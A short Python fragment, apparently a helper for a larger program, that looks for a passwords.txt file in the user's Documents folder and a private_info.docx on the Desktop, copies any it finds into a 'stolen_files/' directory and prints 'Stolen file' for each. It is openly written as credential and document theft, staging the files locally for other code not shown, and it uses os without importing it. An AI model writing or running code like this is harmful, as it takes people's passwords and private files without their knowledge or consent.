# This code is only for the main code to work with
import shutil

sensitive_files = [
    os.path.expanduser("~") + "\\Documents\\passwords.txt",
    os.path.expanduser("~") + "\\Desktop\\private_info.docx",
]

for file in sensitive_files:
    if os.path.exists(file):
        shutil.copy(file, "stolen_files/")
        print(f"Stolen file: {file}")